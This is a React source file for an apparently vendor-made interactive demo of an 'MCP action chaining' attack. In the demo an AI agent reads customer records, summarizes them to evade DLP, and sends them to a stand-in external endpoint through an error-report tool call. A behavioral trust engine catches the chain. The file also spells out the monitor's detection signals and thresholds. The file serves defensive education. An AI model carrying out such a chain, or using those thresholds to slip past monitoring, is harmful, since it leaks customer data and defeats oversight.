"use client";

// ─── Interactive MCP Action Chaining Attack Demo ─────────────────────────────
//
// Simulates the 3-step behavioral trust engine detection from the blog post:
// agentlair.dev/blog/mcp-action-chaining-the-attack-your-permissions-cant-see
//
// All trust math is client-side JS — no backend needed.

import { useState, useEffect, useRef } from "react";
import {
  AlertTriangle,
  Shield,
  ChevronRight,
  RotateCcw,
  CheckCircle,
  XCircle,
  Activity,
  Lock,
} from "lucide-react";

import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";

// ─── Types ────────────────────────────────────────────────────────────────────

interface TrustState {
  score: number;
  consistency: number;
  restraint: number;
  transparency: number;
  atfLevel: "intern" | "junior" | "senior";
  status: "normal" | "warning" | "blocked";
}

interface ActionStep {
  id: number;
  label: string;
  server: string;
  tool: string;
  params: Record<string, unknown>;
  authCheck: string;
  dlpCheck: string;
  rateCheck: string;
  signal: string;
  trustAfter: TrustState;
  alertMessage?: string;
}

// ─── Trust Engine Math (simplified from blog post) ────────────────────────────

const INITIAL_TRUST: TrustState = {
  score: 78,
  consistency: 82,
  restraint: 75,
  transparency: 76,
  atfLevel: "senior",
  status: "normal",
};

// ─── Attack Steps ─────────────────────────────────────────────────────────────

const STEPS: ActionStep[] = [
  {
    id: 1,
    label: "Read customer data",
    server: "filesystem",
    tool: "read_file",
    params: {
      path: "/data/customers/q1-accounts.csv",
    },
    authCheck: "✓ Pass — filesystem:read granted",
    dlpCheck: "✓ Pass — data stays in agent context",
    rateCheck: "✓ Pass — single file read, under threshold",
    signal:
      "JSD spikes 0.02 → 0.31. Agent normally reads config files (73%), not customer CSVs. Consistency dimension drops.",
    trustAfter: {
      score: 67,
      consistency: 44,
      restraint: 72,
      transparency: 74,
      atfLevel: "junior",
      status: "warning",
    },
  },
  {
    id: 2,
    label: "Summarize + strip PII",
    server: "llm",
    tool: "summarize",
    params: {
      content: "<12,847 customer records>",
      format: "compact",
      max_tokens: 800,
    },
    authCheck: "✓ Pass — llm:invoke granted",
    dlpCheck: "✓ Pass — no PII patterns in summarized output",
    rateCheck: "✓ Pass — summarization is a core function",
    signal:
      "Scope utilization jumps 0.41 → 0.87. Three MCP servers accessed in 4s. Zero escalation on sensitive-data access. Restraint score collapses.",
    trustAfter: {
      score: 52,
      consistency: 44,
      restraint: 38,
      transparency: 68,
      atfLevel: "junior",
      status: "warning",
    },
  },
  {
    id: 3,
    label: "Exfil via error report",
    server: "monitoring",
    tool: "report_error",
    params: {
      service: "analytics-pipeline",
      severity: "warning",
      message: "<summarized customer intelligence>",
      endpoint: "https://logs.ext-vendor.example.com/ingest",
    },
    authCheck: "✓ Pass — monitoring:write granted",
    dlpCheck: "✓ Pass — text content, no known malware signatures",
    rateCheck: "✓ Pass — single error report",
    signal:
      "47KB payload vs. 380-byte historical avg (123× anomaly). Read→transform→exfil chain signature detected. Score: 0.38, below trust gate threshold of 0.50.",
    alertMessage: "BLOCKED — trust gate threshold 0.50 not met. Chain broken at step 3.",
    trustAfter: {
      score: 38,
      consistency: 44,
      restraint: 22,
      transparency: 68,
      atfLevel: "intern",
      status: "blocked",
    },
  },
];

// ─── Score Ring ───────────────────────────────────────────────────────────────

function ScoreRing({
  score,
  status,
  animated,
}: {
  score: number;
  status: TrustState["status"];
  animated: boolean;
}) {
  const radius = 40;
  const circumference = 2 * Math.PI * radius;
  const strokeDash = (score / 100) * circumference;

  const color =
    status === "blocked"
      ? "#ef4444"
      : status === "warning"
        ? "#f97316"
        : "#22c55e";

  return (
    <div className="relative flex items-center justify-center w-24 h-24 shrink-0">
      <svg className="absolute inset-0 -rotate-90" viewBox="0 0 96 96">
        <circle
          cx="48"
          cy="48"
          r={radius}
          fill="none"
          strokeWidth="8"
          className="stroke-muted"
        />
        <circle
          cx="48"
          cy="48"
          r={radius}
          fill="none"
          strokeWidth="8"
          stroke={color}
          strokeDasharray={`${strokeDash} ${circumference}`}
          strokeLinecap="round"
          style={{
            transition: animated ? "stroke-dasharray 0.8s ease, stroke 0.4s ease" : "none",
          }}
        />
      </svg>
      <div className="text-center z-10">
        <div
          className="text-2xl font-bold font-mono tabular-nums leading-tight"
          style={{ color, transition: "color 0.4s ease" }}
        >
          {score}
        </div>
        <div className="text-[9px] text-muted-foreground font-semibold uppercase tracking-wide">
          / 100
        </div>
      </div>
    </div>
  );
}

// ─── Dimension Bar ─────────────────────────────────────────────────────────────

function DimBar({
  label,
  value,
  weight,
  animated,
}: {
  label: string;
  value: number;
  weight: string;
  animated: boolean;
}) {
  const barColor =
    value >= 65 ? "bg-green-500" : value >= 40 ? "bg-orange-500" : "bg-red-400";

  return (
    <div>
      <div className="flex justify-between items-center mb-1.5">
        <div className="flex items-center gap-2">
          <span className="text-xs font-medium">{label}</span>
          <span className="text-[10px] text-muted-foreground font-mono">
            w={weight}
          </span>
        </div>
        <span className="text-xs font-mono tabular-nums font-bold">{value}</span>
      </div>
      <div className="h-2 rounded-full bg-muted overflow-hidden">
        <div
          className={`${barColor} h-full rounded-full`}
          style={{
            width: `${value}%`,
            transition: animated ? "width 0.8s ease" : "none",
          }}
        />
      </div>
    </div>
  );
}

// ─── JSON Block ───────────────────────────────────────────────────────────────

function JsonBlock({ step }: { step: ActionStep }) {
  const json = {
    server: step.server,
    tool: step.tool,
    params: step.params,
  };

  return (
    <pre className="text-[11px] leading-relaxed font-mono overflow-x-auto text-left">
      <span className="text-muted-foreground">{"{"}</span>
      {"\n"}
      {Object.entries(json).map(([k, v]) => (
        <span key={k}>
          {"  "}
          <span className="text-blue-400">"{k}"</span>
          <span className="text-muted-foreground">: </span>
          {typeof v === "object" ? (
            <>
              <span className="text-muted-foreground">{"{"}</span>
              {"\n"}
              {Object.entries(v as Record<string, unknown>).map(([pk, pv]) => (
                <span key={pk}>
                  {"    "}
                  <span className="text-emerald-400">"{pk}"</span>
                  <span className="text-muted-foreground">: </span>
                  <span className="text-amber-300">
                    "{String(pv)}"
                  </span>
                  {"\n"}
                </span>
              ))}
              {"  "}
              <span className="text-muted-foreground">{"}"}</span>
            </>
          ) : (
            <span className="text-amber-300">"{String(v)}"</span>
          )}
          {"\n"}
        </span>
      ))}
      <span className="text-muted-foreground">{"}"}</span>
    </pre>
  );
}

// ─── Check Row ────────────────────────────────────────────────────────────────

function CheckRow({ label }: { label: string }) {
  return (
    <div className="flex items-start gap-2 text-xs">
      <CheckCircle className="size-3.5 text-green-500 mt-0.5 shrink-0" />
      <span className="text-muted-foreground">{label}</span>
    </div>
  );
}

// ─── Step Indicator ───────────────────────────────────────────────────────────

function StepIndicator({
  total,
  current,
}: {
  total: number;
  current: number;
}) {
  return (
    <div className="flex items-center gap-2">
      {Array.from({ length: total }).map((_, i) => {
        const done = i < current;
        const active = i === current - 1;
        return (
          <div
            key={i}
            className={`h-1.5 rounded-full transition-all duration-500 ${
              done
                ? active && current === 3
                  ? "bg-red-500 w-8"
                  : done && current > 1 && i === 1
                    ? "bg-orange-500 w-8"
                    : "bg-green-500 w-8"
                : "bg-muted w-4"
            }`}
          />
        );
      })}
    </div>
  );
}

// ─── ATF Badge ────────────────────────────────────────────────────────────────

function AtfBadge({ level }: { level: TrustState["atfLevel"] }) {
  const cfg = {
    senior: "bg-green-500",
    junior: "bg-orange-500",
    intern: "bg-red-500",
  };
  return (
    <span
      className={`${cfg[level]} inline-block rounded-full px-2.5 py-0.5 text-[10px] font-bold text-white capitalize`}
    >
      {level}
    </span>
  );
}

// ─── Main Demo Component ──────────────────────────────────────────────────────

export const AttackDemo = () => {
  const [currentStep, setCurrentStep] = useState(0);
  const [trust, setTrust] = useState<TrustState>(INITIAL_TRUST);
  const [animated, setAnimated] = useState(false);
  const [showSignal, setShowSignal] = useState(false);
  const alertRef = useRef<HTMLDivElement>(null);

  const step = STEPS[currentStep - 1];
  const isFinished = currentStep === STEPS.length;
  const isBlocked = trust.status === "blocked";

  function advance() {
    if (currentStep >= STEPS.length) return;
    const next = STEPS[currentStep];
    setAnimated(true);
    setShowSignal(false);
    setTimeout(() => {
      setTrust(next.trustAfter);
      setShowSignal(true);
    }, 200);
    setCurrentStep((s) => s + 1);
    setTimeout(() => {
      alertRef.current?.scrollIntoView({ behavior: "smooth", block: "nearest" });
    }, 600);
  }

  function reset() {
    setCurrentStep(0);
    setTrust(INITIAL_TRUST);
    setAnimated(false);
    setShowSignal(false);
  }

  const statusLabel = {
    normal: "Normal",
    warning: "Suspicious",
    blocked: "BLOCKED",
  };

  const statusColor = {
    normal: "text-green-500",
    warning: "text-orange-500",
    blocked: "text-red-500",
  };

  return (
    <section className="py-20 lg:py-28">
      <div className="container">
        {/* Header */}
        <div className="mx-auto max-w-2xl text-center mb-12 lg:mb-16">
          <div className="mb-4 inline-flex items-center gap-2 rounded-full border bg-muted/60 px-3 py-1 font-mono text-xs text-muted-foreground">
            <Activity className="size-3" />
            Behavioral Trust Engine: Live Simulation
          </div>
          <h1 className="text-3xl tracking-tight md:text-4xl lg:text-5xl mb-4">
            Three tool calls.
            <br />
            <span className="text-red-500">One exfiltration.</span>
          </h1>
          <p className="text-muted-foreground text-lg leading-snug">
            Each action passes every authorization check. But the{" "}
            <em>sequence</em> triggers AgentLair's behavioral trust engine.
            Step through it yourself.
          </p>
          <p className="text-muted-foreground text-sm mt-2">
            Based on the{" "}
            <a
              href="/blog/mcp-action-chaining-the-attack-your-permissions-cant-see"
              className="text-primary underline underline-offset-4 hover:no-underline"
            >
              MCP action chaining attack
            </a>{" "}
            documented in our blog.
          </p>
        </div>

        {/* Main Demo Area */}
        <div className="mx-auto max-w-5xl">
          <div className="grid gap-6 lg:grid-cols-2">
            {/* Left: Action Panel */}
            <div className="space-y-4">
              {/* Step indicator */}
              <div className="flex items-center justify-between">
                <div className="text-sm font-medium text-muted-foreground font-mono">
                  {currentStep === 0
                    ? "Ready to start"
                    : `Action ${currentStep} of ${STEPS.length}`}
                </div>
                <StepIndicator total={STEPS.length} current={currentStep} />
              </div>

              {/* Tool call card */}
              <Card className="rounded-2xl overflow-hidden">
                <div className="bg-muted/40 border-b px-4 py-2.5 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="size-2.5 rounded-full bg-red-400" />
                    <div className="size-2.5 rounded-full bg-orange-400" />
                    <div className="size-2.5 rounded-full bg-green-400" />
                    <span className="text-xs text-muted-foreground font-mono ml-1">
                      MCP tool call
                    </span>
                  </div>
                  {step && (
                    <span className="text-xs font-mono text-muted-foreground">
                      {step.server}.{step.tool}
                    </span>
                  )}
                </div>
                <CardContent className="p-4 min-h-[180px] flex items-center">
                  {currentStep === 0 ? (
                    <div className="text-center w-full py-6">
                      <Shield className="size-8 text-muted-foreground mx-auto mb-3" />
                      <p className="text-sm text-muted-foreground">
                        Agent is operating normally.
                        <br />
                        Trust score: <strong className="text-green-500">0.78</strong> (ATF Senior).
                      </p>
                    </div>
                  ) : isBlocked && step ? (
                    <div className="w-full">
                      <div className="mb-3 opacity-60">
                        <JsonBlock step={step} />
                      </div>
                    </div>
                  ) : step ? (
                    <JsonBlock step={step} />
                  ) : null}
                </CardContent>
              </Card>

              {/* Auth checks */}
              {step && (
                <Card className="rounded-2xl">
                  <CardContent className="p-4 space-y-2">
                    <p className="text-[10px] font-mono text-muted-foreground uppercase tracking-widest mb-3">
                      Security checks
                    </p>
                    <CheckRow label={step.authCheck} />
                    <CheckRow label={step.dlpCheck} />
                    <CheckRow label={step.rateCheck} />
                  </CardContent>
                </Card>
              )}

              {/* Blocked overlay */}
              {isBlocked && step?.alertMessage && (
                <div
                  ref={alertRef}
                  className="rounded-2xl border border-red-500/40 bg-red-500/10 p-4 space-y-2"
                >
                  <div className="flex items-center gap-2">
                    <XCircle className="size-4 text-red-500 shrink-0" />
                    <span className="text-sm font-bold text-red-500">
                      AgentLair blocked this call
                    </span>
                  </div>
                  <p className="text-xs text-muted-foreground pl-6">
                    {step.alertMessage}
                  </p>
                  <p className="text-xs text-muted-foreground pl-6">
                    Customer data never reached the attacker's endpoint.
                  </p>
                </div>
              )}
            </div>

            {/* Right: Trust Engine Panel */}
            <div className="space-y-4">
              {/* Live trust score */}
              <Card className="rounded-2xl">
                <CardContent className="p-5">
                  <div className="flex items-center gap-5 mb-5">
                    <ScoreRing
                      score={trust.score}
                      status={trust.status}
                      animated={animated}
                    />
                    <div className="space-y-2">
                      <div>
                        <p className="text-[10px] font-mono text-muted-foreground uppercase tracking-widest">
                          Trust score
                        </p>
                        <p className="text-2xl font-bold font-mono">
                          {(trust.score / 100).toFixed(2)}
                        </p>
                      </div>
                      <div className="flex items-center gap-2 flex-wrap">
                        <AtfBadge level={trust.atfLevel} />
                        <span
                          className={`text-xs font-medium ${statusColor[trust.status]}`}
                        >
                          {statusLabel[trust.status]}
                        </span>
                      </div>
                      {isBlocked && (
                        <p className="text-[10px] text-red-500 font-mono">
                          Below gate threshold (0.50)
                        </p>
                      )}
                    </div>
                  </div>

                  {/* Dimension bars */}
                  <div className="space-y-3">
                    <DimBar
                      label="Consistency"
                      value={trust.consistency}
                      weight="35.7%"
                      animated={animated}
                    />
                    <DimBar
                      label="Restraint"
                      value={trust.restraint}
                      weight="42.9%"
                      animated={animated}
                    />
                    <DimBar
                      label="Transparency"
                      value={trust.transparency}
                      weight="21.4%"
                      animated={animated}
                    />
                  </div>
                </CardContent>
              </Card>

              {/* Signal explanation */}
              <Card className="rounded-2xl min-h-[120px]">
                <CardContent className="p-4">
                  <p className="text-[10px] font-mono text-muted-foreground uppercase tracking-widest mb-3">
                    Trust engine signal
                  </p>
                  {currentStep === 0 ? (
                    <p className="text-sm text-muted-foreground">
                      Agent has 90-day baseline. JSD stable at 0.02. Scope utilization 0.41. No anomalies.
                    </p>
                  ) : showSignal && step ? (
                    <div
                      className="text-sm text-muted-foreground leading-relaxed"
                      style={{ animation: "fadeIn 0.4s ease" }}
                    >
                      <p>{step.signal}</p>
                    </div>
                  ) : (
                    <div className="flex items-center gap-2 text-sm text-muted-foreground">
                      <div className="size-1.5 rounded-full bg-primary animate-pulse" />
                      Calculating…
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* Action button */}
              <div className="flex gap-3">
                {!isFinished ? (
                  <Button
                    onClick={advance}
                    className="flex-1 gap-2"
                    size="lg"
                  >
                    {currentStep === 0 ? "Start simulation" : "Next action"}
                    <ChevronRight className="size-4" />
                  </Button>
                ) : (
                  <Button
                    onClick={reset}
                    variant="outline"
                    className="flex-1 gap-2"
                    size="lg"
                  >
                    <RotateCcw className="size-4" />
                    Restart
                  </Button>
                )}
                {currentStep > 0 && (
                  <Button
                    onClick={reset}
                    variant="outline"
                    size="lg"
                    className="gap-2"
                  >
                    <RotateCcw className="size-4" />
                  </Button>
                )}
              </div>
            </div>
          </div>

          {/* Bottom: How it works */}
          <div className="mt-12 border-t pt-10">
            <div className="grid gap-6 sm:grid-cols-3 text-sm">
              <div>
                <div className="flex items-center gap-2 mb-2">
                  <div className="size-2 rounded-full bg-green-500" />
                  <span className="font-semibold text-xs uppercase tracking-wide font-mono">
                    Consistency
                  </span>
                </div>
                <p className="text-muted-foreground text-xs leading-relaxed">
                  Jensen-Shannon divergence between 7-day and 90-day tool
                  category distributions. A JSD spike above 0.20 signals
                  behavioral drift from baseline.
                </p>
              </div>
              <div>
                <div className="flex items-center gap-2 mb-2">
                  <div className="size-2 rounded-full bg-orange-500" />
                  <span className="font-semibold text-xs uppercase tracking-wide font-mono">
                    Restraint
                  </span>
                </div>
                <p className="text-muted-foreground text-xs leading-relaxed">
                  Scope utilization with Gaussian penalty at extremes, plus
                  escalation appropriateness. Agents that use everything available
                  without asking are flagged.
                </p>
              </div>
              <div>
                <div className="flex items-center gap-2 mb-2">
                  <div className="size-2 rounded-full bg-blue-500" />
                  <span className="font-semibold text-xs uppercase tracking-wide font-mono">
                    Transparency
                  </span>
                </div>
                <p className="text-muted-foreground text-xs leading-relaxed">
                  Payload size percentiles against 90-day baseline. Chain
                  integrity analysis: read→transform→exfil within one session
                  window is a known exfiltration signature.
                </p>
              </div>
            </div>
          </div>

          {/* CTA */}
          {isBlocked && (
            <div
              className="mt-10 rounded-2xl border border-primary/20 bg-primary/5 p-8 text-center"
              style={{ animation: "fadeIn 0.6s ease" }}
            >
              <Lock className="size-8 text-primary mx-auto mb-4" />
              <h2 className="text-xl font-semibold tracking-tight mb-2">
                This is what L5 looks like.
              </h2>
              <p className="text-muted-foreground text-sm max-w-md mx-auto mb-6">
                Permissions said yes. Authorization said yes. DLP said yes. The
                behavioral trust engine said no — and broke the chain before
                the data left.
              </p>
              <div className="flex flex-wrap items-center justify-center gap-4">
                <Button asChild size="lg">
                  <a href="/register">Join the waitlist</a>
                </Button>
                <Button variant="outline" size="lg" asChild>
                  <a href="/blog/mcp-action-chaining-the-attack-your-permissions-cant-see">
                    Read the full analysis
                  </a>
                </Button>
              </div>
            </div>
          )}
        </div>
      </div>

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(4px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </section>
  );
};
